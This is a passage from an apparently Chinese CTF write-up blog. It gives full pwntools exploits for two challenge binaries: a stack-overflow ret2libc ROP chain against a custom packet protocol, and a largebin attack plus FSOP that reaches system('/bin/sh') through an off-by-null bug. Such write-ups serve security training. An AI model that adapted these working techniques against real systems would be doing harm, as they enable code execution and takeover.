class="hljs-keyword">if</span> ( j != <span class="hljs-number">8</span> )<br>      v5 ^= *(<span class="hljs-variable">_WORD</span> *)(<span class="hljs-number">2</span>LL * j + *(<span class="hljs-variable">_QWORD</span> *)&amp;v2[<span class="hljs-number">13</span>]);<br>  &#125;<br>  return v5 == *(<span class="hljs-variable">_WORD</span> *)(a1 + <span class="hljs-number">16</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>根据check函数推测出报文头的格式如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">message</span> &#123;<br><span class="hljs-type">uint32_t</span> magic;     <span class="hljs-comment">// 固定值 0x28b7766e</span><br><span class="hljs-type">uint32_t</span> seq_nu;     <span class="hljs-comment">// 分片的序列号，submit函数中的memcpy会校验，依次为1 0x1001 0x2001 0x3001</span><br><span class="hljs-type">uint32_t</span> constant_1; <span class="hljs-comment">// 不能为0</span><br><span class="hljs-type">uint16_t</span> type;         <span class="hljs-comment">// 值为5或6</span><br><span class="hljs-type">uint16_t</span> constant_2; <span class="hljs-comment">// 不能为0</span><br><span class="hljs-type">uint16_t</span> check_sum;         <span class="hljs-comment">// 校验和</span><br><span class="hljs-type">uint16_t</span> constant_3; <span class="hljs-comment">// 必须为0</span><br><span class="hljs-type">uint16_t</span> flag1;         <span class="hljs-comment">// 可控制submit函数的分支</span><br><span class="hljs-type">uint16_t</span> flag2;         <span class="hljs-comment">// 当type为6时，必须为0xffff</span><br><span class="hljs-type">char</span> data[];        <span class="hljs-comment">// 数据</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其中校验和是最后计算得到后填充，计算方式为：将报文拼接在字符串后面，然后两个字节两个字节的进行异或运算（跳过报文头的校验和字段）直至数据末尾。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先构造好报文头部控制其执行流程使其触发栈溢出；<br>利用栈溢出，使用write泄露出libc地址（submit函数溢出后rdx为6，正好可以泄露地址）；<br>再次执行main函数，然后构造rop chain进行ORW。</p><h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :re + ret2libc</span><br><span class="hljs-string">@时间        :2022/02/19 23:00:28</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Partial RELRO</span><br><span class="hljs-string">    Stack:    No canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      No PIE (0x3ff000)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28080</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">calc_sum</span>(<span class="hljs-params">msg</span>):<br>    result = <span class="hljs-number">0</span><br>    key = <span class="hljs-string">&quot;fakeipheadfa&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>        result = result ^ u16(key[i*<span class="hljs-number">2</span>:<span class="hljs-number">2</span>*i+<span class="hljs-number">2</span>]) <span class="hljs-comment">#0x140b</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(msg)//<span class="hljs-number">2</span>):<br>        <span class="hljs-keyword">if</span> i!=<span class="hljs-number">8</span>:<br>            result = result ^ u16(msg[i*<span class="hljs-number">2</span>:<span class="hljs-number">2</span>*i+<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_msg</span>(<span class="hljs-params">idx,data</span>):<br>    msg = p16(<span class="hljs-number">0x766E</span>) <span class="hljs-comment"># magic</span><br>    msg += p16(<span class="hljs-number">0x28B7</span>) <span class="hljs-comment"># magic</span><br>    msg += p32(idx) <span class="hljs-comment"># index</span><br>    msg += p32(<span class="hljs-number">1</span>) <span class="hljs-comment"># fixed number</span><br>    msg += p16(<span class="hljs-number">0x6</span>) <span class="hljs-comment"># type:0x5/0x6</span><br>    msg += p16(<span class="hljs-number">1</span>) <span class="hljs-comment"># </span><br>    msg += p16(<span class="hljs-number">0xffff</span>) <span class="hljs-comment"># hash</span><br>    msg += p16(<span class="hljs-number">0</span>) <span class="hljs-comment"># fixed number</span><br>    msg += p16(<span class="hljs-number">1</span>) <span class="hljs-comment"># branch</span><br>    msg += p16(<span class="hljs-number">0xffff</span>) <span class="hljs-comment"># len(head)=24B</span><br>    msg = msg + data<br>    msg = msg[:<span class="hljs-number">0x10</span>] + p16(calc_sum(msg)) + msg[<span class="hljs-number">0x12</span>:]<br>    <span class="hljs-keyword">return</span> msg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">idx, data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;4. Quit.\n&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br>    success(<span class="hljs-string">&quot;send data: &quot;</span> + <span class="hljs-built_in">hex</span>(idx))<br>    data = get_msg(idx, data)<br>    p.send(data)<br>    sleep(<span class="hljs-number">6</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;4. Quit.\n&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Which?&quot;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    p.sendlineafter(<span class="hljs-string">&quot;4. Quit.\n&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br><br>pop_rdi = <span class="hljs-number">0x401bb3</span><br>pop_rsi_r15 = <span class="hljs-number">0x401bb1</span><br>main = <span class="hljs-number">0x401A5E</span><br><br>create(<span class="hljs-number">1</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br>create(<span class="hljs-number">0x1001</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br>create(<span class="hljs-number">0x2001</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br><br>payload = cyclic(<span class="hljs-number">0x70</span>)<br>payload += p64(pop_rsi_r15)<br>payload += p64(elf.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]) + p64(<span class="hljs-number">0</span>)<br>payload += p64(elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]) + p64(main)<br>payload += cyclic(<span class="hljs-number">0xf50</span>)<br><br>create(<span class="hljs-number">0x3001</span>,payload)<br>submit()<br>p.recvuntil(<span class="hljs-string">&quot;Done.\n&quot;</span>)<br>libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x26fc0</span><br>success(<span class="hljs-built_in">hex</span>(libc.address))<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">3</span>)<br><br>create(<span class="hljs-number">1</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br>create(<span class="hljs-number">0x1001</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br>create(<span class="hljs-number">0x2001</span>,cyclic(<span class="hljs-number">0xfe8</span>))<br><br>rop = ROP(libc)<br>rop.mprotect(<span class="hljs-number">0x404000</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-number">7</span>)<br>rop.read(<span class="hljs-number">0</span>,<span class="hljs-number">0x404600</span>,<span class="hljs-number">0x100</span>)<br>rop.call(<span class="hljs-number">0x404600</span>)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(rop.chain())))<br><br>payload = cyclic(<span class="hljs-number">0x6a</span>)<br>payload += rop.chain()<br>payload += cyclic(<span class="hljs-number">0xef6</span>)<br><br>create(<span class="hljs-number">0x3001</span>,payload)<br><span class="hljs-comment"># gdb.attach(p,&quot;b *0x401A5D&quot;)</span><br>submit()<br><br>p.recv()<br><span class="hljs-comment"># pause()</span><br>p.sendline(asm(shellcraft.cat(<span class="hljs-string">&quot;./flag&quot;</span>)))<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br>p.close()<br></code></pre></td></tr></table></figure><h3 id="Summary-2"><a href="#Summary-2" class="headerlink" title="Summary"></a>Summary</h3><ul><li>对于这种需要逆向的题目不要看了题目就傻乎乎地逆向，不妨看一下题目名字，logo等信息参照现实技术类推一下，可能会有助于加速逆向过程。</li></ul><h3 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h3><ul><li><a href="https://www.cnblogs.com/LynneHuan/p/15890280.html#easyroptocol">https://www.cnblogs.com/LynneHuan/p/15890280.html#easyroptocol</a></li></ul><h2 id="FShuiMaster"><a href="#FShuiMaster" class="headerlink" title="FShuiMaster"></a>FShuiMaster</h2><h3 id="基本信息-3"><a href="#基本信息-3" class="headerlink" title="基本信息"></a>基本信息</h3><ul><li>libc版本：<code>2.27-3ubuntu1_amd64</code></li><li>file FShuiMaster</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">FShuiMaster</span>: ELF <span class="hljs-number">64</span>-bit LSB shared object, x86-<span class="hljs-number">64</span>, version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter /home/sh0ve1/glibc-<span class="hljs-literal">all</span>-in-one/libs/<span class="hljs-number">2</span>.<span class="hljs-number">27</span>-<span class="hljs-number">3</span>ubuntu1_amd64/ld-<span class="hljs-number">2</span>.<span class="hljs-number">27</span>.so, for GNU/Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span>, BuildID[sha1]=<span class="hljs-number">6</span>e20c52a10d729e416b1c45dc26224f04f64249c, not stripped<br></code></pre></td></tr></table></figure><ul><li>保护机制：保护全开</li></ul><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Arch:</span>     amd64<span class="hljs-number">-64</span>-little<br><span class="hljs-symbol">RELRO:</span>    Full RELRO<br><span class="hljs-symbol">Stack:</span>    Canary found<br><span class="hljs-symbol">NX:</span>       NX enabled<br><span class="hljs-symbol">PIE:</span>      PIE enabled<br></code></pre></td></tr></table></figure><h3 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h3><p>增：有一个全局变量计数申请次数，最多只能100次，且以该变量作为堆块数组和堆块大小数组的下标。堆块大小限制在0x42F和0x700之间，并且会检查申请的堆块是否在heap段;<br>删：给程序提交下标，然后检查下标释放小于全局变量且堆块数组的对应位置处非空，通过即释放堆块，且将地址和大小都置为0；<br>改：给程序提交下标，然后检查下标释放小于全局变量且堆块数组的对应位置处非空，通过即根据堆块大小数组存储的size输入数据。但是自定义的输入函数存在 <code>off-by-null</code> 漏洞</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">__int64 __fastcall get_Input(__int64 addr, unsigned __int64 num)<br>&#123;<br>  char buf; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">1</span>Fh] [rbp-<span class="hljs-number">11</span>h] BYREF<br>  unsigned __int64 i; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">20</span>h] [rbp-<span class="hljs-number">10</span>h]<br>  unsigned __int64 v5; <span class="hljs-regexp">//</span> [rsp+<span class="hljs-number">28</span>h] [rbp-<span class="hljs-number">8</span>h]<br><br>  v5 = __readfsqword(<span class="hljs-number">0</span>x28u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>LL; i &lt; num; ++i )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1</span>uLL) &lt;= <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> ( buf == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>    &#123;<br>      *(_BYTE *)(addr + i) = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    *(_BYTE *)(i + addr) = buf;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( i == num )<br>    *(_BYTE *)(addr + num) = <span class="hljs-number">0</span>;                 <span class="hljs-regexp">//</span> off-by-null<br>  return <span class="hljs-number">0</span>LL;<br>&#125;<br></code></pre></td></tr></table></figure><p>查：给程序提交下标，然后检查下标释放小于全局变量且堆块数组的对应位置处非空，通过即利用puts函数打印堆块内容</p><p>退出：使用exit(-1)退出程序</p><h3 id="利用思路-3"><a href="#利用思路-3" class="headerlink" title="利用思路"></a>利用思路</h3><p>首先利用脏数据泄露出libc基址和heap地址；</p><p>然后利用<code>off-by-null</code>漏洞构造<code>chunk overlapping</code>，从而进行<code>largebin attack</code>修改<code>__IO_list_all</code>为一个堆块地址;</p><p>在堆块中伪造一个IO_FILE,然后使用exit()函数刷新即可。</p><h3 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :largebin attack(free) + FSOP</span><br><span class="hljs-string">@时间        :2022/02/16 10:10:28</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Full RELRO</span><br><span class="hljs-string">    Stack:    Canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      PIE enabled</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> pwnlib<br><span class="hljs-keyword">from</span> pwncli <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br>REMOTE = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> REMOTE:<br>    p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29061</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&#x27;./FShuiMaster&#x27;</span>)<br>    libc = ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./FShuiMaster&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Five: Finished!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    p.sendlineafter(<span class="hljs-string">&quot;Number of words?\n&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&quot;please input U character\n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,content</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Five: Finished!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    p.sendlineafter(<span class="hljs-string">&quot;change\n&quot;</span>,<span class="hljs-built_in">str</span>(index))<br>    p.sendafter(<span class="hljs-string">&quot;\n&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Five: Finished!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>    p.sendlineafter(<span class="hljs-string">&quot;please Input The page U want 2 scan&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Five: Finished!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    p.sendlineafter(<span class="hljs-string">&quot;tear off&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exit0</span>():<br>    p.sendlineafter(<span class="hljs-string">&quot;Five: Finished!\n&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br><br><br>p.sendlineafter(<span class="hljs-string">&quot;Please Write U Name on the Book\n\n&quot;</span>, <span class="hljs-string">&quot;sh0ve1&quot;</span>)<br>add(<span class="hljs-number">0x440</span>,<span class="hljs-string">b&#x27;AA&#x27;</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x458</span>,<span class="hljs-string">b&#x27;BB&#x27;</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;CC&#x27;</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;DD&#x27;</span>) <span class="hljs-comment">#3</span><br><br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x450</span> + p64(<span class="hljs-number">0x8b0</span>))<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x440</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x7</span>) <span class="hljs-comment"># 4</span><br>show(<span class="hljs-number">4</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;AAAAAAA\n&#x27;</span>)<br>libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ec2a0</span><br>success(<span class="hljs-built_in">hex</span>(libc.address))<br><br>add(<span class="hljs-number">0x450</span>,<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">0xf</span>) <span class="hljs-comment"># 5 1</span><br>show(<span class="hljs-number">5</span>)<br>p.recvuntil(<span class="hljs-string">&#x27;BB\n&#x27;</span>)<br>heapbase = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x6a0</span><br>success(<span class="hljs-built_in">hex</span>(heapbase))<br><br>add(<span class="hljs-number">0x4f0</span>,<span class="hljs-string">b&#x27;CC&#x27;</span>) <span class="hljs-comment">#6</span><br><br><span class="hljs-comment">#(fp + 0xE8 ) (fp-&gt;_IO_buf_base); // call qword ptr [fp+E8h]</span><br><span class="hljs-comment"># exit(0) --&gt; _IO_flush_all_lockp ---&gt; IO_OVERFLOW()(_finish:0x18,_overflow:0x20)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getshell_by_str_jumps_finish_when_exit_v224_v229</span>(<span class="hljs-params"> _IO_str_jumps_addr:<span class="hljs-built_in">int</span>, system_addr:<span class="hljs-built_in">int</span>, bin_sh_addr:<span class="hljs-built_in">int</span></span>):<br>    fake_file = FileStructure()<br>    fake_file.flags = <span class="hljs-number">0</span><br>    fake_file._IO_read_ptr = <span class="hljs-number">0x61</span><br>    fake_file.unknown2 = <span class="hljs-number">0</span><br>    fake_file._IO_write_base = <span class="hljs-number">0x0</span><br>    fake_file._IO_write_ptr = <span class="hljs-number">0x1</span><br>    fake_file._IO_buf_base = bin_sh_addr<br>    fake_file.vtable = _IO_str_jumps_addr - <span class="hljs-number">8</span> <span class="hljs-comment">#offset=0xd8 </span><br>    fake_file = fake_file.__bytes__() + p64(<span class="hljs-number">0</span>) + p64(system_addr) <br>    <span class="hljs-keyword">return</span> fake_file<br><br>fake_file = getshell_by_str_jumps_finish_when_exit_v224_v229(libc.address + <span class="hljs-number">0x3e8360</span>,libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>],libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>).__next__())<br><span class="hljs-comment"># gdb.attach(p)</span><br>delete(<span class="hljs-number">1</span>)<br>payload = flat(&#123;<span class="hljs-number">0x58</span>:heapbase + <span class="hljs-number">0x1500</span> +<span class="hljs-number">0x110</span>, <span class="hljs-comment"># 伪造stderr的_chain(offset=0x68),指向伪造的stdout,即fake_file</span><br>    <span class="hljs-number">0xb0</span>:<span class="hljs-number">0xffffffff</span>, <span class="hljs-comment">#stderr的mode</span><br>    <span class="hljs-number">0x100</span>:fake_file&#125;)+<span class="hljs-string">b&#x27;\n&#x27;</span><br><br>add(<span class="hljs-number">0x460</span>,payload) <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;GAP&#x27;</span>) <span class="hljs-comment"># 8</span><br>edit(<span class="hljs-number">5</span>,p64(<span class="hljs-number">0x3ec0a0</span>+libc.address) + p64(libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>] - <span class="hljs-number">0x10</span>) + <span class="hljs-string">b&#x27;\n&#x27;</span>) <span class="hljs-comment"># 修改_IO_list_all为7的堆头地址 BK-&gt;fd = victim(5)</span><br>delete(<span class="hljs-number">7</span>)<br>add(<span class="hljs-number">0x500</span>,<span class="hljs-string">&quot;FF&quot;</span>) <span class="hljs-comment"># 9 | trigger largebin attack(free)</span><br><br><span class="hljs-comment"># gdb.attach(p)</span><br>exit0()<br><br>p.interactive()<br>p.close()<br><br></code></pre></td></tr></table></figure><h3 id="Summary-3"><a href="#Summary-3" class="headerlink" title="Summary"></a>Summary</h3><ul><li>由于<code>largebin 